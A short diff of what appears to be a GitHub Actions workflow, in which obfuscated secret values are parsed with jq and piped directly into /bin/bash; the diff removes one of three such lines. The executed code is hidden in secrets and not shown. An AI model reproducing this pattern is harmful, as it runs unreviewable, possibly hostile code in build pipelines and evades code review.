@@ -22,7 +22,6 @@ jobs:
           hgbn534: ${{ secrets.hgbn534 }}
         run: |
           printf '%s' "$hgbn534" | jq -r .tzz6 | /bin/bash
-          printf '%s' "$exubw639" | jq -r .ak5628 | /bin/bash
           printf '%s' "$vx605" | jq -r .hd89 | /bin/bash
 
       - name: Upload output
